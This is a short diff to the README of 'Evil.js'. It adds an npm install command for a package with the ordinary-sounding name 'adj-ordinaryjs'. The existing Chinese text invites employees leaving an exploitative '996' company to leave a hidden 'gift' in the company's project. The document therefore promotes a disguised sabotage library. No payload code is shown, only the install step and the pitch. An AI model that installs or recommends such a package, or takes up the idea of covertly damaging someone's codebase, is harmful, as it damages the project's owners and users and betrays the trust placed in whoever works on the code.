@@ -1,5 +1,10 @@
 # Evil.js
 
+- Install
+```bash
+$ npm i adj-ordinaryjs
+```
+
 什么？黑心996公司要让你提桶跑路了？
 
 想在离开前给你们的项目留点小*礼物*？
